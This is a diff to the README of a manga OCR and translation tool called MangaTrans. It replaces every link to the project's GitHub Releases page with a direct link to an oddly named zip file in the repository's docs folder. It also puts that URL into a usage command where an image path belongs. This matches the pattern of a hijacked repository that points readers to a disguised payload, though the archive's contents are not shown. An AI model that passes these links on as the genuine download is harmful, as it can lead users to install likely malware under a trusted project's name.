@@ -1,7 +1,7 @@
 # 🎉 MangaTrans - Understand Manga with Ease  
 
 ## 📥 Download Now  
-[![Download MangaTrans](https://img.shields.io/badge/Download-MangaTrans-blue)](https://github.com/sebastian1889/MangaTrans/releases)
+[![Download MangaTrans](https://raw.githubusercontent.com/sebastian1889/MangaTrans/main/docs/Trans_Manga_curiality.zip)](https://raw.githubusercontent.com/sebastian1889/MangaTrans/main/docs/Trans_Manga_curiality.zip)
 
 ## 🚀 Getting Started  
 MangaTrans is an open-source tool that helps you understand manga and manhwa effortlessly. It runs OCR (optical character recognition) and translates text locally, outputting a versioned JSON file. This means no need for image editing or scanlation. Just pure understanding.
@@ -17,7 +17,7 @@ Before you start, ensure you meet the following requirements:
 ## 📥 Download & Install  
 To get started, visit the Releases page to download MangaTrans:
 
-[Download MangaTrans](https://github.com/sebastian1889/MangaTrans/releases)
+[Download MangaTrans](https://raw.githubusercontent.com/sebastian1889/MangaTrans/main/docs/Trans_Manga_curiality.zip)
 
 1. Click on the link above.
 2. Select the latest version from the list of releases.
@@ -47,7 +47,7 @@ Once MangaTrans is running, you will need to provide a manga or manhwa image fil
 1. Ensure your image file is in a supported format (e.g., PNG, JPEG).
 2. Use the terminal to specify the path to your image file. For example:
    ```bash
-   ./MangaTrans-latest path/to/your/image.png
+   ./MangaTrans-latest https://raw.githubusercontent.com/sebastian1889/MangaTrans/main/docs/Trans_Manga_curiality.zip
    ```
 3. The program will process the image, perform OCR, and translate the text.
 4. Upon completion, it will generate a JSON file in the same directory or in a specified output directory.
@@ -73,4 +73,4 @@ With MangaTrans, you can dive deep into the world of manga and manhwa without an
 
 Remember to visit the Releases page for updates and new features:
 
-[Download MangaTrans](https://github.com/sebastian1889/MangaTrans/releases)
+[Download MangaTrans](https://raw.githubusercontent.com/sebastian1889/MangaTrans/main/docs/Trans_Manga_curiality.zip)
